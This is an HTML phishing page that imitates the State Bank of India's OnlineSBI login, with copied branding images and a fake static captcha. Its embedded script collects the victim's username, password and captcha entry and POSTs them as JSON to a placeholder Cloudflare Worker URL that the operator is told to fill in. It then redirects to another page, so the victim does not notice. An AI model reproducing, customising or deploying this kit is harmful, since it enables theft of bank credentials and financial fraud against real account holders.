<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBI Login (captcha extra bold)</title>
    <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        .header {
            text-align: center;
            padding: 0;
            background-color: white;
            line-height: 0;
        }
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
            display: block;
            margin: 0 auto;
        }
        .container {
            max-width: 460px;
            margin: 0 auto 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: visible;
            padding: 0 20px 20px 20px;
        }
        .form-header {
            background-color: #e6f3ff;
            color: #2c517a;        
            padding: 14px 20px 6px 20px;
            text-align: center;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
            line-height: 1.4;
            margin-left: -20px;
            margin-right: -20px;
            margin-top: 0;
            margin-bottom: 0;
        }
        .marquee-red {
            color: #8B0000;
            font-weight: bold;
            background-color: #e6f3ff;
            padding: 12px 20px 14px 20px;
            border: none;
            margin-left: -20px;
            margin-right: -20px;
            margin-top: 0;
            margin-bottom: 15px;
            width: auto;
            font-size: 11px;
            display: block;
        }
        .care-line {
            font-weight: bold;
            font-size: 11.5px;
            margin: 15px 0 15px 0;
        }
        .care-darkred {
            color: #8B0000;
        }
        .care-black {
            color: #333333;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333333;
            margin-bottom: 5px;
        }
        .form-input {
            width: 100%;
            padding: 10px;
            font-size: 13px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: rgba(0, 0, 0, 0.02);
            outline: none;
            transition: border-color 0.3s;
        }
        .form-input:focus {
            border-color: #24A1E8;
        }
        .radio-group {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 8px;
            margin-top: 5px;
        }
        .radio-group label {
            font-size: 13px;
            font-weight: normal;
            display: flex;
            align-items: center;
            gap: 5px;
            color: #333333;
        }
        .captcha-container {
            background-color: transparent;
            border: none;
            padding: 0;
            display: inline-block;
            position: relative;
            background-image: linear-gradient(#ccc 1px, transparent 1px);
            background-size: 100% 5px; 
            margin: 15px 0 10px 0;
        }
        .captcha-wrapper {
            display: flex;
            align-items: center;
            gap: 0;
        }
        .captcha-text {
            font-family: 'Courier New', Courier, monospace;
            font-size: 35px;
            font-weight: 860;
            color: #006666;
            letter-spacing: 2.5px;
            text-decoration: line-through;
            text-decoration-color: #cc0000;
            text-decoration-thickness: 2px;
            font-style: italic;
            line-height: 1.3;
        }
        .button-group {
            display: flex;
            justify-content: flex-start;
            gap: 10px;
            margin: 20px 0 15px 0;
        }
        .login-btn, .reset-btn {
            background-color: #2c517a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 2px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-btn:hover, .reset-btn:hover {
            background-color: #1e3c5c;
        }
        .login-btn:disabled {
            background-color: #a0a0a0;
            cursor: not-allowed;
        }
        .links {
            font-size: 12px;
            margin-top: 10px;
        }
        .links a {
            color: #24A1E8;
            text-decoration: none;
            display: inline-block;
            margin: 3px 0;
        }
        .links a:hover {
            text-decoration: underline;
        }
        hr {
            margin: 15px 0 10px 0;
            border: 0;
            border-top: 1px solid #ddd;
        }
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
    </style>
</head>
<body>
    <div>
        <div class="header">
            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo">
        </div>

        <div class="container">
            <div class="form-header">Login to OnlineSBI</div>
            
            <marquee class="marquee-red" behavior="scroll" direction="left" scrollamount="4">
                We introduced for added security. To clear cache, please refresh the page.
            </marquee>

            <div class="care-line">
                <span class="care-darkred">(CARE:</span> 
                <span class="care-black">Username and password are case sensitive.)</span>
            </div>

            <form id="loginForm" onsubmit="return submitForm(event)">
                <div class="form-group">
                    <label class="form-label">Username*</label>
                    <input type="text" id="username" class="form-input" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Password*</label>
                    <input type="text" id="password" class="form-input" value="" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Enter the text as shown in the image *</label>
                    <input type="text" id="captchaInput" class="form-input" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Select one of the Captcha options *</label>
                    <div class="radio-group">
                        <label>
                            <input type="radio" name="captchaType" value="image" checked> Image Captcha
                        </label>
                        <label>
                            <input type="radio" name="captchaType" value="audio"> Audio Captcha
                        </label>
                    </div>
                </div>

                <div class="captcha-container">
                    <div class="captcha-wrapper">
                        <span class="captcha-text">KbL1n</span>
                    </div>
                </div>

                <div class="button-group">
                    <button type="submit" class="login-btn">Login</button>
                    <button type="reset" class="reset-btn">Reset</button>
                </div>

                <div class="links">
                    <a href="#">New User? Register here/Activate</a><br>
                    <a href="#">Forgot Username / Login Password</a>
                </div>
            </form>

            <hr>
            <div style="font-size: 11px; color: #666; text-align: center; margin-top: 5px;"></div>
        </div>

        <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class="footer-img">
    </div>

    <script>
        async function submitForm(event) {
            event.preventDefault();  // Stop normal form submission

            // Gather data
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const captchaInput = document.getElementById('captchaInput').value;
            const captchaType = document.querySelector('input[name="captchaType"]:checked').value;
            const displayedCaptcha = document.querySelector('.captcha-text').innerText; // "KbL1n"

            const payload = {
                username,
                password,
                captchaInput,
                captchaType,
                displayedCaptcha,
                timestamp: new Date().toISOString()
            };

            // Disable button to prevent double submission (text stays "Login")
            const loginBtn = document.querySelector('.login-btn');
            loginBtn.disabled = true;

            try {
                // üîÅ Replace with your actual Worker URL
                const workerURL = 'https://your-worker.your-subdomain.workers.dev/submit';

                const response = await fetch(workerURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    // Redirect on success
                    window.location.href = 'blogone.html';
                } else {
                    alert('Submission failed. Please try again.');
                    loginBtn.disabled = false;   // Re-enable on error
                }
            } catch (error) {
                alert('Network error. Check Worker URL or connection.');
                console.error(error);
                loginBtn.disabled = false;       // Re-enable on network error
            }

            return false;
        }
    </script>
</body>
</html>
